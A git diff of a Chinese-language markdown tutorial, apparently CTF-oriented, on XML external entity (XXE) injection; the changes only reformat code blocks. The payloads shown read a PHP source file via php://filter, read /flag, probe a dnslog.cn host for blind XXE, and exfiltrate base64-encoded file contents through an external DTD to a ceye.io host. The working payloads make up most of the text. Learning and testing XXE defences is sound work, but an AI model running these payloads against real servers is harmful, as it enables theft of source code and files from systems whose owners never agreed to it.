@@ -124,11 +124,14 @@ c) DTD 可以分为两种，内部DTD,外部DTD.
 
 条件:**当输入错误用户名和密码时,服务段会返回用户名**
 
-`<!DOCTYPE updateProfile [
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE updateProfile [
 <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./doLogin.php"> 
 ]>
 
-<user><username>&xxe;</username><password>123</password></user>`
+<user><username>&xxe;</username><password>123</password></user>
+```
 
 burpsuite抓包之后填充以上内容
 
@@ -138,11 +141,14 @@ burpsuite抓包之后填充以上内容
 
 读取文件
 
-`<!DOCTYPE updateProfile [
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE updateProfile [
 <!ENTITY xxe SYSTEM "file:///flag"> 
 ]>
 
-<user><username>&xxe;</username><password>123</password></user>`
+<user><username>&xxe;</username><password>123</password></user>
+```
 
 以上是存在回显的利用，输入的参数会在服务端中返回，那么当参数不回显时怎么利用呢？
 
@@ -155,12 +161,15 @@ burpsuite抓包之后填充以上内容
 
 
 
-`<!DOCTYPE updateProfile [
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE updateProfile [
 <!ENTITY % xxe SYSTEM "http://2n24n8.dnslog.cn">
 %xxe; 
 ]>
 
-<user><username>aaaa</username><password>123</password></user>`
+<user><username>aaaa</username><password>123</password></user>
+```
 
 那么如何获取数据内容呢？
 
@@ -169,18 +178,25 @@ burpsuite抓包之后填充以上内容
 
 
 
-`<!DOCTYPE updateProfile [
+```
+<!DOCTYPE updateProfile [
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./doLogin.php">
 <!ENTITY % dtd SYSTEM "http://本机ip:88/1.dtd">
 %dtd;
 %send;
 ]>
 
-<user><username>aaaa</username><password>123</password></user>`
+<user><username>aaaa</username><password>123</password></user>
+```
 
 1.dtd内容如下
 
-`<!ENTITY % all 
-"<!ENTITY &#x25; send SYSTEM 'http://cyuhik.ceye.io/?data=%file;'>"
+>```
+><!ENTITY % all 
+>"<!ENTITY &#x25; send SYSTEM 'http://cyuhik.ceye.io/?data=%file;'>"
 >
->%all;`
+>>%all;
+>```
+>
+>
+>
